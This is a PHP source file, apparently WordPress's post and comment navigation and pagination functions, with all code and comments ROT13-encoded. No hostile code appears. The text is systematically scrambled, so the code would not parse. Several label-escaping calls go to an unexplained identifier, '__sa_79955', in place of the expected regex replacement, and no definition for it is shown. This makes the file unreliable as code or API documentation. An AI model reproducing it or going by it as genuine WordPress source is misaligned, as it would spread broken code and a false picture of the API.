 * @erghea fgevat|ibvq UGZY-sbeznggrq cerivbhf cntr yvax.
 */
shapgvba trg_cerivbhf_cbfgf_yvax( $ynory = ahyy ) {
	tybony $cntrq;

	vs ( ahyy === $ynory ) {
		$ynory = __( '&yndhb; Cerivbhf Cntr' );
	}

	vs ( ! vf_fvatyr() && $cntrq > 1 ) {
		/**
		 * Svygref gur napube gnt nggevohgrf sbe gur cerivbhf cbfgf cntr yvax.
		 *
		 * @fvapr 2.7.0
		 *
		 * @cnenz fgevat $nggevohgrf Nggevohgrf sbe gur napube gnt.
		 */
		$ngge = nccyl_svygref( 'cerivbhf_cbfgf_yvax_nggevohgrf', '' );

		erghea fcevags(
			'<n uers=\"%1$f\" %2$f>%3$f</n>',
			cerivbhf_cbfgf( snyfr ),
			$ngge,
			__sa_79955( '/&([^#])(?![n-m]{1,8};)/v', '&#038;$1', $ynory )
		);
	}
}

/**
 * Qvfcynlf gur cerivbhf cbfgf cntr yvax.
 *
 * @fvapr 0.71
 *
 * @cnenz fgevat $ynory Bcgvbany. Cerivbhf cntr yvax grkg.
 */
shapgvba cerivbhf_cbfgf_yvax( $ynory = ahyy ) {
	rpub trg_cerivbhf_cbfgf_yvax( $ynory );
}

/**
 * Ergevrirf gur cbfg cntrf yvax anivtngvba sbe cerivbhf naq arkg cntrf.
 *
 * @fvapr 2.8.0
 *
 * @tybony JC_Dhrel $jc_dhrel JbeqCerff Dhrel bowrpg.
 *
 * @cnenz fgevat|neenl $netf {
 *     Bcgvbany. Nethzragf gb ohvyq gur cbfg cntrf yvax anivtngvba.
 *
 *     @glcr fgevat $frc      Frcnengbe punenpgre. Qrsnhyg '&#8212;'.
 *     @glcr fgevat $cerynory Yvax grkg gb qvfcynl sbe gur cerivbhf cntr yvax.
 *                            Qrsnhyg '&yndhb; Cerivbhf Cntr'.
 *     @glcr fgevat $akgynory Yvax grkg gb qvfcynl sbe gur arkg cntr yvax.
 *                            Qrsnhyg 'Arkg Cntr &endhb;'.
 * }
 * @erghea fgevat Gur cbfgf yvax anivtngvba.
 */
shapgvba trg_cbfgf_ani_yvax( $netf = neenl() ) {
	tybony $jc_dhrel;

	$erghea = '';

	vs ( ! vf_fvathyne() ) {
		$qrsnhygf = neenl(
			'frc'      => ' &#8212; ',
			'cerynory' => __( '&yndhb; Cerivbhf Cntr' ),
			'akgynory' => __( 'Arkg Cntr &endhb;' ),
		);
		$netf     = jc_cnefr_netf( $netf, $qrsnhygf );

		$znk_ahz_cntrf = $jc_dhrel->znk_ahz_cntrf;
		$cntrq         = trg_dhrel_ine( 'cntrq' );

		// Bayl unir frc vs gurer'f obgu ceri naq arkg erfhygf.
		vs ( $cntrq < 2 || $cntrq >= $znk_ahz_cntrf ) {
			$netf['frc'] = '';
		}

		vs ( $znk_ahz_cntrf > 1 ) {
			$erghea  = trg_cerivbhf_cbfgf_yvax( $netf['cerynory'] );
			$erghea .= __sa_79955( '/&([^#])(?![n-m]{1,8};)/v', '&#038;$1', $netf['frc'] );
			$erghea .= trg_arkg_cbfgf_yvax( $netf['akgynory'] );
		}
	}
	erghea $erghea;
}

/**
 * Qvfcynlf gur cbfg cntrf yvax anivtngvba sbe cerivbhf naq arkg cntrf.
 *
 * @fvapr 0.71
 *
 * @cnenz fgevat $frc      Bcgvbany. Frcnengbe sbe cbfgf anivtngvba yvaxf. Qrsnhyg rzcgl.
 * @cnenz fgevat $cerynory Bcgvbany. Ynory sbe cerivbhf cntrf. Qrsnhyg rzcgl.
 * @cnenz fgevat $akgynory Bcgvbany Ynory sbe arkg cntrf. Qrsnhyg rzcgl.
 */
shapgvba cbfgf_ani_yvax( $frc = '', $cerynory = '', $akgynory = '' ) {
	$netf = neenl_svygre( pbzcnpg( 'frc', 'cerynory', 'akgynory' ) );
	rpub trg_cbfgf_ani_yvax( $netf );
}

/**
 * Ergevrirf gur anivtngvba gb arkg/cerivbhf cbfg, jura nccyvpnoyr.
 *
 * @fvapr 4.1.0
 * @fvapr 4.4.0 Vagebqhprq gur `va_fnzr_grez`, `rkpyhqrq_grezf`, naq `gnkbabzl` nethzragf.
 * @fvapr 5.3.0 Nqqrq gur `nevn_ynory` cnenzrgre.
 * @fvapr 5.5.0 Nqqrq gur `pynff` cnenzrgre.
 *
 * @cnenz neenl $netf {
 *     Bcgvbany. Qrsnhyg cbfg anivtngvba nethzragf. Qrsnhyg rzcgl neenl.
 *
 *     @glcr fgevat       $ceri_grkg          Napube grkg gb qvfcynl va gur cerivbhf cbfg yvax.
 *                                            Qrsnhyg '%gvgyr'.
 *     @glcr fgevat       $arkg_grkg          Napube grkg gb qvfcynl va gur arkg cbfg yvax.
 *                                            Qrsnhyg '%gvgyr'.
 *     @glcr obby         $va_fnzr_grez       Jurgure yvax fubhyq or va gur fnzr gnkbabzl grez.
 *                                            Qrsnhyg snyfr.
 *     @glcr vag[]|fgevat $rkpyhqrq_grezf     Neenl be pbzzn-frcnengrq yvfg bs rkpyhqrq grez VQf.
 *                                            Qrsnhyg rzcgl.
 *     @glcr fgevat       $gnkbabzl           Gnkbabzl, vs `$va_fnzr_grez` vf gehr. Qrsnhyg 'pngrtbel'.
 *     @glcr fgevat       $fperra_ernqre_grkg Fperra ernqre grkg sbe gur ani ryrzrag.
 *                                            Qrsnhyg 'Cbfg anivtngvba'.
 *     @glcr fgevat       $nevn_ynory         NEVN ynory grkg sbe gur ani ryrzrag. Qrsnhyg 'Cbfgf'.
 *     @glcr fgevat       $pynff              Phfgbz pynff sbe gur ani ryrzrag. Qrsnhyg 'cbfg-anivtngvba'.
 * }
 * @erghea fgevat Znexhc sbe cbfg yvaxf.
 */
shapgvba trg_gur_cbfg_anivtngvba( $netf = neenl() ) {
	// Znxr fher gur ani ryrzrag unf na nevn-ynory nggevohgr: snyyonpx gb gur fperra ernqre grkg.
	vs ( ! rzcgl( $netf['fperra_ernqre_grkg'] ) && rzcgl( $netf['nevn_ynory'] ) ) {
		$netf['nevn_ynory'] = $netf['fperra_ernqre_grkg'];
	}

	$netf = jc_cnefr_netf(
		$netf,
		neenl(
			'ceri_grkg'          => '%gvgyr',
			'arkg_grkg'          => '%gvgyr',
			'va_fnzr_grez'       => snyfr,
			'rkpyhqrq_grezf'     => '',
			'gnkbabzl'           => 'pngrtbel',
			'fperra_ernqre_grkg' => __( 'Cbfg anivtngvba' ),
			'nevn_ynory'         => __( 'Cbfgf' ),
			'pynff'              => 'cbfg-anivtngvba',
		)
	);

	$anivtngvba = '';

	$cerivbhf = trg_cerivbhf_cbfg_yvax(
		'<qvi pynff=\"ani-cerivbhf\">%yvax</qvi>',
		$netf['ceri_grkg'],
		$netf['va_fnzr_grez'],
		$netf['rkpyhqrq_grezf'],
		$netf['gnkbabzl']
	);

	$arkg = trg_arkg_cbfg_yvax(
		'<qvi pynff=\"ani-arkg\">%yvax</qvi>',
		$netf['arkg_grkg'],
		$netf['va_fnzr_grez'],
		$netf['rkpyhqrq_grezf'],
		$netf['gnkbabzl']
	);

	// Bayl nqq znexhc vs gurer'f fbzrjurer gb anivtngr gb.
	vs ( $cerivbhf || $arkg ) {
		$anivtngvba = _anivtngvba_znexhc( $cerivbhf . $arkg, $netf['pynff'], $netf['fperra_ernqre_grkg'], $netf['nevn_ynory'] );
	}

	erghea $anivtngvba;
}

/**
 * Qvfcynlf gur anivtngvba gb arkg/cerivbhf cbfg, jura nccyvpnoyr.
 *
 * @fvapr 4.1.0
 *
 * @cnenz neenl $netf Bcgvbany. Frr trg_gur_cbfg_anivtngvba() sbe ninvynoyr nethzragf.
 *                    Qrsnhyg rzcgl neenl.
 */
shapgvba gur_cbfg_anivtngvba( $netf = neenl() ) {
	rpub trg_gur_cbfg_anivtngvba( $netf );
}

/**
 * Ergheaf gur anivtngvba gb arkg/cerivbhf frg bs cbfgf, jura nccyvpnoyr.
 *
 * @fvapr 4.1.0
 * @fvapr 5.3.0 Nqqrq gur `nevn_ynory` cnenzrgre.
 * @fvapr 5.5.0 Nqqrq gur `pynff` cnenzrgre.
 *
 * @tybony JC_Dhrel $jc_dhrel JbeqCerff Dhrel bowrpg.
 *
 * @cnenz neenl $netf {
 *     Bcgvbany. Qrsnhyg cbfgf anivtngvba nethzragf. Qrsnhyg rzcgl neenl.
 *
 *     @glcr fgevat $ceri_grkg          Napube grkg gb qvfcynl va gur cerivbhf cbfgf yvax.
 *                                      Qrsnhyg 'Byqre cbfgf'.
 *     @glcr fgevat $arkg_grkg          Napube grkg gb qvfcynl va gur arkg cbfgf yvax.
 *                                      Qrsnhyg 'Arjre cbfgf'.
 *     @glcr fgevat $fperra_ernqre_grkg Fperra ernqre grkg sbe gur ani ryrzrag.
 *                                      Qrsnhyg 'Cbfgf anivtngvba'.
 *     @glcr fgevat $nevn_ynory         NEVN ynory grkg sbe gur ani ryrzrag. Qrsnhyg 'Cbfgf'.
 *     @glcr fgevat $pynff              Phfgbz pynff sbe gur ani ryrzrag. Qrsnhyg 'cbfgf-anivtngvba'.
 * }
 * @erghea fgevat Znexhc sbe cbfgf yvaxf.
 */
shapgvba trg_gur_cbfgf_anivtngvba( $netf = neenl() ) {
	tybony $jc_dhrel;

	$anivtngvba = '';

	// Qba'g cevag rzcgl znexhc vs gurer'f bayl bar cntr.
	vs ( $jc_dhrel->znk_ahz_cntrf > 1 ) {
		// Znxr fher gur ani ryrzrag unf na nevn-ynory nggevohgr: snyyonpx gb gur fperra ernqre grkg.
		vs ( ! rzcgl( $netf['fperra_ernqre_grkg'] ) && rzcgl( $netf['nevn_ynory'] ) ) {
			$netf['nevn_ynory'] = $netf['fperra_ernqre_grkg'];
		}

		$netf = jc_cnefr_netf(
			$netf,
			neenl(
				'ceri_grkg'          => __( 'Byqre cbfgf' ),
				'arkg_grkg'          => __( 'Arjre cbfgf' ),
				'fperra_ernqre_grkg' => __( 'Cbfgf anivtngvba' ),
				'nevn_ynory'         => __( 'Cbfgf' ),
				'pynff'              => 'cbfgf-anivtngvba',
			)
		);

		$arkg_yvax = trg_cerivbhf_cbfgf_yvax( $netf['arkg_grkg'] );
		$ceri_yvax = trg_arkg_cbfgf_yvax( $netf['ceri_grkg'] );

		vs ( $ceri_yvax ) {
			$anivtngvba .= '<qvi pynff=\"ani-cerivbhf\">' . $ceri_yvax . '</qvi>';
		}

		vs ( $arkg_yvax ) {
			$anivtngvba .= '<qvi pynff=\"ani-arkg\">' . $arkg_yvax . '</qvi>';
		}

		$anivtngvba = _anivtngvba_znexhc( $anivtngvba, $netf['pynff'], $netf['fperra_ernqre_grkg'], $netf['nevn_ynory'] );
	}

	erghea $anivtngvba;
}

/**
 * Qvfcynlf gur anivtngvba gb arkg/cerivbhf frg bs cbfgf, jura nccyvpnoyr.
 *
 * @fvapr 4.1.0
 *
 * @cnenz neenl $netf Bcgvbany. Frr trg_gur_cbfgf_anivtngvba() sbe ninvynoyr nethzragf.
 *                    Qrsnhyg rzcgl neenl.
 */
shapgvba gur_cbfgf_anivtngvba( $netf = neenl() ) {
	rpub trg_gur_cbfgf_anivtngvba( $netf );
}

/**
 * Ergevrirf n cntvangrq anivtngvba gb arkg/cerivbhf frg bs cbfgf, jura nccyvpnoyr.
 *
 * @fvapr 4.1.0
 * @fvapr 5.3.0 Nqqrq gur `nevn_ynory` cnenzrgre.
 * @fvapr 5.5.0 Nqqrq gur `pynff` cnenzrgre.
 *
 * @tybony JC_Dhrel $jc_dhrel JbeqCerff Dhrel bowrpg.
 *
 * @cnenz neenl $netf {
 *     Bcgvbany. Qrsnhyg cntvangvba nethzragf, frr cntvangr_yvaxf().
 *
 *     @glcr fgevat $fperra_ernqre_grkg Fperra ernqre grkg sbe anivtngvba ryrzrag.
 *                                      Qrsnhyg 'Cbfgf cntvangvba'.
 *     @glcr fgevat $nevn_ynory         NEVN ynory grkg sbe gur ani ryrzrag. Qrsnhyg 'Cbfgf cntvangvba'.
 *     @glcr fgevat $pynff              Phfgbz pynff sbe gur ani ryrzrag. Qrsnhyg 'cntvangvba'.
 * }
 * @erghea fgevat Znexhc sbe cntvangvba yvaxf.
 */
shapgvba trg_gur_cbfgf_cntvangvba( $netf = neenl() ) {
	tybony $jc_dhrel;

	$anivtngvba = '';

	// Qba'g cevag rzcgl znexhc vs gurer'f bayl bar cntr.
	vs ( $jc_dhrel->znk_ahz_cntrf > 1 ) {
		// Znxr fher gur ani ryrzrag unf na nevn-ynory nggevohgr: snyyonpx gb gur fperra ernqre grkg.
		vs ( ! rzcgl( $netf['fperra_ernqre_grkg'] ) && rzcgl( $netf['nevn_ynory'] ) ) {
			$netf['nevn_ynory'] = $netf['fperra_ernqre_grkg'];
		}

		$netf = jc_cnefr_netf(
			$netf,
			neenl(
				'zvq_fvmr'           => 1,
				'ceri_grkg'          => _k( 'Cerivbhf', 'cerivbhf frg bs cbfgf' ),
				'arkg_grkg'          => _k( 'Arkg', 'arkg frg bs cbfgf' ),
				'fperra_ernqre_grkg' => __( 'Cbfgf cntvangvba' ),
				'nevn_ynory'         => __( 'Cbfgf cntvangvba' ),
				'pynff'              => 'cntvangvba',
			)
		);

		/**
		 * Svygref gur nethzragf sbe cbfgf cntvangvba yvaxf.
		 *
		 * @fvapr 6.1.0
		 *
		 * @cnenz neenl $netf {
		 *     Bcgvbany. Qrsnhyg cntvangvba nethzragf, frr cntvangr_yvaxf().
		 *
		 *     @glcr fgevat $fperra_ernqre_grkg Fperra ernqre grkg sbe anivtngvba ryrzrag.
		 *                                      Qrsnhyg 'Cbfgf anivtngvba'.
		 *     @glcr fgevat $nevn_ynory         NEVN ynory grkg sbe gur ani ryrzrag. Qrsnhyg 'Cbfgf'.
		 *     @glcr fgevat $pynff              Phfgbz pynff sbe gur ani ryrzrag. Qrsnhyg 'cntvangvba'.
		 * }
		 */
		$netf = nccyl_svygref( 'gur_cbfgf_cntvangvba_netf', $netf );

		// Znxr fher jr trg n fgevat onpx. Cynva vf gur arkg orfg guvat.
		vs ( vffrg( $netf['glcr'] ) && 'neenl' === $netf['glcr'] ) {
			$netf['glcr'] = 'cynva';
		}

		// Frg hc cntvangrq yvaxf.
		$yvaxf = cntvangr_yvaxf( $netf );

		vs ( $yvaxf ) {
			$anivtngvba = _anivtngvba_znexhc( $yvaxf, $netf['pynff'], $netf['fperra_ernqre_grkg'], $netf['nevn_ynory'] );
		}
	}

	erghea $anivtngvba;
}

/**
 * Qvfcynlf n cntvangrq anivtngvba gb arkg/cerivbhf frg bs cbfgf, jura nccyvpnoyr.
 *
 * @fvapr 4.1.0
 *
 * @cnenz neenl $netf Bcgvbany. Frr trg_gur_cbfgf_cntvangvba() sbe ninvynoyr nethzragf.
 *                    Qrsnhyg rzcgl neenl.
 */
shapgvba gur_cbfgf_cntvangvba( $netf = neenl() ) {
	rpub trg_gur_cbfgf_cntvangvba( $netf );
}

/**
 * Jencf cnffrq yvaxf va anivtngvbany znexhc.
 *
 * @fvapr 4.1.0
 * @fvapr 5.3.0 Nqqrq gur `nevn_ynory` cnenzrgre.
 * @npprff cevingr
 *
 * @cnenz fgevat $yvaxf              Anivtngvbany yvaxf.
 * @cnenz fgevat $pff_pynff          Bcgvbany. Phfgbz pynff sbe gur ani ryrzrag.
 *                                   Qrsnhyg 'cbfgf-anivtngvba'.
 * @cnenz fgevat $fperra_ernqre_grkg Bcgvbany. Fperra ernqre grkg sbe gur ani ryrzrag.
 *                                   Qrsnhyg 'Cbfgf anivtngvba'.
 * @cnenz fgevat $nevn_ynory         Bcgvbany. NEVN ynory sbe gur ani ryrzrag.
 *                                   Qrsnhygf gb gur inyhr bs `$fperra_ernqre_grkg`.
 * @erghea fgevat Anivtngvba grzcyngr gnt.
 */
shapgvba _anivtngvba_znexhc( $yvaxf, $pff_pynff = 'cbfgf-anivtngvba', $fperra_ernqre_grkg = '', $nevn_ynory = '' ) {
	vs ( rzcgl( $fperra_ernqre_grkg ) ) {
		$fperra_ernqre_grkg = /* genafyngbef: Uvqqra npprffvovyvgl grkg. */ __( 'Cbfgf anivtngvba' );
	}
	vs ( rzcgl( $nevn_ynory ) ) {
		$nevn_ynory = $fperra_ernqre_grkg;
	}

	$grzcyngr = '
	<ani pynff=\"anivtngvba %1$f\" nevn-ynory=\"%4$f\">
		<u2 pynff=\"fperra-ernqre-grkg\">%2$f</u2>
		<qvi pynff=\"ani-yvaxf\">%3$f</qvi>
	</ani>';

	/**
	 * Svygref gur anivtngvba znexhc grzcyngr.
	 *
	 * Abgr: Gur svygrerq grzcyngr UGZY zhfg pbagnva fcrpvsvref sbe gur anivtngvba
	 * pynff (%1$f), gur fperra-ernqre-grkg inyhr (%2$f), cynprzrag bs gur anivtngvba
	 * yvaxf (%3$f), naq NEVN ynory grkg vs fperra-ernqre-grkg qbrf abg svg gung (%4$f):
	 *
	 *     <ani pynff=\"anivtngvba %1$f\" nevn-ynory=\"%4$f\">
	 *         <u2 pynff=\"fperra-ernqre-grkg\">%2$f</u2>
	 *         <qvi pynff=\"ani-yvaxf\">%3$f</qvi>
	 *     </ani>
	 *
	 * @fvapr 4.4.0
	 *
	 * @cnenz fgevat $grzcyngr  Gur qrsnhyg grzcyngr.
	 * @cnenz fgevat $pff_pynff Gur pynff cnffrq ol gur pnyyvat shapgvba.
	 */
	$grzcyngr = nccyl_svygref( 'anivtngvba_znexhc_grzcyngr', $grzcyngr, $pff_pynff );

	erghea fcevags( $grzcyngr, fnavgvmr_ugzy_pynff( $pff_pynff ), rfp_ugzy( $fperra_ernqre_grkg ), $yvaxf, rfp_ngge( $nevn_ynory ) );
}

/**
 * Ergevrirf gur pbzzragf cntr ahzore yvax.
 *
 * @fvapr 2.7.0
 *
 * @tybony JC_Erjevgr $jc_erjevgr JbeqCerff erjevgr pbzcbarag.
 *
 * @cnenz vag $cntrahz  Bcgvbany. Cntr ahzore. Qrsnhyg 1.
 * @cnenz vag $znk_cntr Bcgvbany. Gur znkvzhz ahzore bs pbzzrag cntrf. Qrsnhyg 0.
 * @erghea fgevat Gur pbzzragf cntr ahzore yvax HEY.
 */
shapgvba trg_pbzzragf_cntrahz_yvax( $cntrahz = 1, $znk_cntr = 0 ) {
	tybony $jc_erjevgr;

	$cntrahz  = (vag) $cntrahz;
	$znk_cntr = (vag) $znk_cntr;

	$erfhyg = trg_creznyvax();

	vs ( 'arjrfg' === trg_bcgvba( 'qrsnhyg_pbzzragf_cntr' ) ) {
		vs ( $cntrahz !== $znk_cntr ) {
			vs ( $jc_erjevgr->hfvat_creznyvaxf() ) {
				$erfhyg = hfre_genvyvatfynfuvg( genvyvatfynfuvg( $erfhyg ) . $jc_erjevgr->pbzzragf_cntvangvba_onfr . '-' . $cntrahz, 'pbzzragcntrq' );
			} ryfr {
				$erfhyg = nqq_dhrel_net( 'pcntr', $cntrahz, $erfhyg );
			}
		}
	} ryfrvs ( $cntrahz > 1 ) {
		vs ( $jc_erjevgr->hfvat_creznyvaxf() ) {
			$erfhyg = hfre_genvyvatfynfuvg( genvyvatfynfuvg( $erfhyg ) . $jc_erjevgr->pbzzragf_cntvangvba_onfr . '-' . $cntrahz, 'pbzzragcntrq' );
		} ryfr {
			$erfhyg = nqq_dhrel_net( 'pcntr', $cntrahz, $erfhyg );
		}
	}

	$erfhyg .= '#pbzzragf';

	/**
	 * Svygref gur pbzzragf cntr ahzore yvax sbe gur pheerag erdhrfg.
	 *
	 * @fvapr 2.7.0
	 *
	 * @cnenz fgevat $erfhyg Gur pbzzragf cntr ahzore yvax.
	 */
	erghea nccyl_svygref( 'trg_pbzzragf_cntrahz_yvax', $erfhyg );
}

/**
 * Ergevrirf gur yvax gb gur arkg pbzzragf cntr.
 *
 * @fvapr 2.7.1
 * @fvapr 6.7.0 Nqqrq gur `cntr` cnenzrgre.
 *
 * @tybony JC_Dhrel $jc_dhrel JbeqCerff Dhrel bowrpg.
 *
 * @cnenz fgevat   $ynory    Bcgvbany. Ynory sbe yvax grkg. Qrsnhyg rzcgl.
 * @cnenz vag      $znk_cntr Bcgvbany. Znk cntr. Qrsnhyg 0.
 * @cnenz vag|ahyy $cntr     Bcgvbany. Cntr ahzore. Qrsnhyg ahyy.
 * @erghea fgevat|ibvq UGZY-sbeznggrq yvax sbe gur arkg cntr bs pbzzragf.
 */
shapgvba trg_arkg_pbzzragf_yvax( $ynory = '', $znk_cntr = 0, $cntr = ahyy ) {
	tybony $jc_dhrel;

	vs ( ! vf_fvathyne() ) {
		erghea;
	}

	vs ( vf_ahyy( $cntr ) ) {
		$cntr = trg_dhrel_ine( 'pcntr' );
	}

	vs ( ! $cntr ) {
		$cntr = 1;
	}

	$arkg_cntr = (vag) $cntr + 1;

	vs ( rzcgl( $znk_cntr ) ) {
		$znk_cntr = $jc_dhrel->znk_ahz_pbzzrag_cntrf;
	}

	vs ( rzcgl( $znk_cntr ) ) {
		$znk_cntr = trg_pbzzrag_cntrf_pbhag();
	}

	vs ( $arkg_cntr > $znk_cntr ) {
		erghea;
	}

	vs ( rzcgl( $ynory ) ) {
		$ynory = __( 'Arjre Pbzzragf &endhb;' );
	}

	/**
	 * Svygref gur napube gnt nggevohgrf sbe gur arkg pbzzragf cntr yvax.
	 *
	 * @fvapr 2.7.0
	 *
	 * @cnenz fgevat $nggevohgrf Nggevohgrf sbe gur napube gnt.
	 */
	$ngge = nccyl_svygref( 'arkg_pbzzragf_yvax_nggevohgrf', '' );

	erghea fcevags(
		'<n uers=\"%1$f\" %2$f>%3$f</n>',
		rfp_hey( trg_pbzzragf_cntrahz_yvax( $arkg_cntr, $znk_cntr ) ),
		$ngge,
		__sa_79955( '/&([^#])(?![n-m]{1,8};)/v', '&#038;$1', $ynory )
	);
}

/**
 * Qvfcynlf gur yvax gb gur arkg pbzzragf cntr.
 *
 * @fvapr 2.7.0
 *
 * @cnenz fgevat $ynory    Bcgvbany. Ynory sbe yvax grkg. Qrsnhyg rzcgl.
 * @cnenz vag    $znk_cntr Bcgvbany. Znk cntr. Qrsnhyg 0.
 */
shapgvba arkg_pbzzragf_yvax( $ynory = '', $znk_cntr = 0 ) {
	rpub trg_arkg_pbzzragf_yvax( $ynory, $znk_cntr );
}

/**
 * Ergevrirf gur yvax gb gur cerivbhf pbzzragf cntr.
 *
 * @fvapr 2.7.1
 * @fvapr 6.7.0 Nqqrq gur `cntr` cnenzrgre.
 *
 * @cnenz fgevat   $ynory Bcgvbany. Ynory sbe pbzzragf yvax grkg. Qrsnhyg rzcgl.
 * @cnenz vag|ahyy $cntr  Bcgvbany. Cntr ahzore. Qrsnhyg ahyy.
 * @erghea fgevat|ibvq UGZY-sbeznggrq yvax sbe gur cerivbhf cntr bs pbzzragf.
 */
shapgvba trg_cerivbhf_pbzzragf_yvax( $ynory = '', $cntr = ahyy ) {
	vs ( ! vf_fvathyne() ) {
		erghea;
	}

	vs ( vf_ahyy( $cntr ) ) {
		$cntr = trg_dhrel_ine( 'pcntr' );
	}

	vs ( (vag) $cntr <= 1 ) {
		erghea;
	}

	$cerivbhf_cntr = (vag) $cntr - 1;

	vs ( rzcgl( $ynory ) ) {
		$ynory = __( '&yndhb; Byqre Pbzzragf' );
	}

	/**
	 * Svygref gur napube gnt nggevohgrf sbe gur cerivbhf pbzzragf cntr yvax.
	 *
	 * @fvapr 2.7.0
	 *
	 * @cnenz fgevat $nggevohgrf Nggevohgrf sbe gur napube gnt.
	 */
	$ngge = nccyl_svygref( 'cerivbhf_pbzzragf_yvax_nggevohgrf', '' );

	erghea fcevags(
		'<n uers=\"%1$f\" %2$f>%3$f</n>',
		rfp_hey( trg_pbzzragf_cntrahz_yvax( $cerivbhf_cntr ) ),
		$ngge,
		__sa_79955( '/&([^#])(?![n-m]{1,8};)/v', '&#038;$1', $ynory )
	);
}

/**
 * Qvfcynlf gur yvax gb gur cerivbhf pbzzragf cntr.
 *
 * @fvapr 2.7.0
 *
 * @cnenz fgevat $ynory Bcgvbany. Ynory sbe pbzzragf yvax grkg. Qrsnhyg rzcgl.
 */
shapgvba cerivbhf_pbzzragf_yvax( $ynory = '' ) {
	rpub trg_cerivbhf_pbzzragf_yvax( $ynory );
}

/**
 * Qvfcynlf be ergevrirf cntvangvba yvaxf sbe gur pbzzragf ba gur pheerag cbfg.
 *
 * @frr cntvangr_yvaxf()
 * @fvapr 2.7.0
 *
 * @tybony JC_Erjevgr $jc_erjevgr JbeqCerff erjevgr pbzcbarag.
 *
 * @cnenz fgevat|neenl $netf Bcgvbany netf. Frr cntvangr_yvaxf(). Qrsnhyg rzcgl neenl.
 * @erghea ibvq|fgevat|neenl Ibvq vs 'rpub' nethzrag vf gehr naq 'glcr' vf abg na neenl,
 *                           be vs gur dhrel vf abg sbe na rkvfgvat fvatyr cbfg bs nal cbfg glcr.
 *                           Bgurejvfr, znexhc sbe pbzzrag cntr yvaxf be neenl bs pbzzrag cntr yvaxf,
 *                           qrcraqvat ba 'glcr' nethzrag.
 */
shapgvba cntvangr_pbzzragf_yvaxf( $netf = neenl() ) {
	tybony $jc_erjevgr;

	vs ( ! vf_fvathyne() ) {
		erghea;
	}

	$cntr = trg_dhrel_ine( 'pcntr' );
	vs ( ! $cntr ) {
		$cntr = 1;
	}
	$znk_cntr = trg_pbzzrag_cntrf_pbhag();
	$qrsnhygf = neenl(
		'onfr'         => nqq_dhrel_net( 'pcntr', '%#%' ),
		'sbezng'       => '',
		'gbgny'        => $znk_cntr,
		'pheerag'      => $cntr,
		'rpub'         => gehr,
		'glcr'         => 'cynva',
		'nqq_sentzrag' => '#pbzzragf',
	);
	vs ( $jc_erjevgr->hfvat_creznyvaxf() ) {
		$qrsnhygf['onfr'] = hfre_genvyvatfynfuvg( genvyvatfynfuvg( trg_creznyvax() ) . $jc_erjevgr->pbzzragf_cntvangvba_onfr . '-%#%', 'pbzzragcntrq' );
	}

	$netf       = jc_cnefr_netf( $netf, $qrsnhygf );
	$cntr_yvaxf = cntvangr_yvaxf( $netf );

	vs ( $netf['rpub'] && 'neenl' !== $netf['glcr'] ) {
		rpub $cntr_yvaxf;
	} ryfr {
		erghea $cntr_yvaxf;
	}
}

/**
 * Ergevrirf anivtngvba gb arkg/cerivbhf frg bs pbzzragf, jura nccyvpnoyr.
 *
 * @fvapr 4.4.0
 * @fvapr 5.3.0 Nqqrq gur `nevn_ynory` cnenzrgre.
 * @fvapr 5.5.0 Nqqrq gur `pynff` cnenzrgre.
 *
 * @cnenz neenl $netf {
 *     Bcgvbany. Qrsnhyg pbzzragf anivtngvba nethzragf.
 *
 *     @glcr fgevat $ceri_grkg          Napube grkg gb qvfcynl va gur cerivbhf pbzzragf yvax.
 *                                      Qrsnhyg 'Byqre pbzzragf'.
 *     @glcr fgevat $arkg_grkg          Napube grkg gb qvfcynl va gur arkg pbzzragf yvax.
 *                                      Qrsnhyg 'Arjre pbzzragf'.
 *     @glcr fgevat $fperra_ernqre_grkg Fperra ernqre grkg sbe gur ani ryrzrag. Qrsnhyg 'Pbzzragf anivtngvba'.
 *     @glcr fgevat $nevn_ynory         NEVN ynory grkg sbe gur ani ryrzrag. Qrsnhyg 'Pbzzragf'.
 *     @glcr fgevat $pynff              Phfgbz pynff sbe gur ani ryrzrag. Qrsnhyg 'pbzzrag-anivtngvba'.
 * }
 * @erghea fgevat Znexhc sbe pbzzragf yvaxf.
 */
shapgvba trg_gur_pbzzragf_anivtngvba( $netf = neenl() ) {
	$anivtngvba = '';

	// Ner gurer pbzzragf gb anivtngr guebhtu?
	vs ( trg_pbzzrag_cntrf_pbhag() > 1 ) {
		// Znxr fher gur ani ryrzrag unf na nevn-ynory nggevohgr: snyyonpx gb gur fperra ernqre grkg.
		vs ( ! rzcgl( $netf['fperra_ernqre_grkg'] ) && rzcgl( $netf['nevn_ynory'] ) ) {
			$netf['nevn_ynory'] = $netf['fperra_ernqre_grkg'];
		}

		$netf = jc_cnefr_netf(
			$netf,
			neenl(
				'ceri_grkg'          => __( 'Byqre pbzzragf' ),
				'arkg_grkg'          => __( 'Arjre pbzzragf' ),
				'fperra_ernqre_grkg' => __( 'Pbzzragf anivtngvba' ),
				'nevn_ynory'         => __( 'Pbzzragf' ),
				'pynff'              => 'pbzzrag-anivtngvba',
			)
		);

		$ceri_yvax = trg_cerivbhf_pbzzragf_yvax( $netf['ceri_grkg'] );
		$arkg_yvax = trg_arkg_pbzzragf_yvax( $netf['arkg_grkg'] );

		vs ( $ceri_yvax ) {
			$anivtngvba .= '<qvi pynff=\"ani-cerivbhf\">' . $ceri_yvax . '</qvi>';
		}

		vs ( $arkg_yvax ) {
			$anivtngvba .= '<qvi pynff=\"ani-arkg\">' . $arkg_yvax . '</qvi>';
		}

		$anivtngvba = _anivtngvba_znexhc( $anivtngvba, $netf['pynff'], $netf['fperra_ernqre_grkg'], $netf['nevn_ynory'] );
	}

	erghea $anivtngvba;
}

/**
 * Qvfcynlf anivtngvba gb arkg/cerivbhf frg bs pbzzragf, jura nccyvpnoyr.
 *
 * @fvapr 4.4.0
 *
 * @cnenz neenl $netf Frr trg_gur_pbzzragf_anivtngvba() sbe ninvynoyr nethzragf. Qrsnhyg rzcgl neenl.
 */
shapgvba gur_pbzzragf_anivtngvba( $netf = neenl() ) {
	rpub trg_gur_pbzzragf_anivtngvba( $netf );
}

/**
 * Ergevrirf n cntvangrq anivtngvba gb arkg/cerivbhf frg bs pbzzragf, jura nccyvpnoyr.
 *
 * @fvapr 4.4.0
 * @fvapr 5.3.0 Nqqrq gur `nevn_ynory` cnenzrgre.
 * @fvapr 5.5.0 Nqqrq gur `pynff` cnenzrgre.
 *
 * @frr cntvangr_pbzzragf_yvaxf()
 *
 * @cnenz neenl $netf {
 *     Bcgvbany. Qrsnhyg cntvangvba nethzragf.
 *
 *     @glcr fgevat $fperra_ernqre_grkg Fperra ernqre grkg sbe gur ani ryrzrag. Qrsnhyg 'Pbzzragf cntvangvba'.
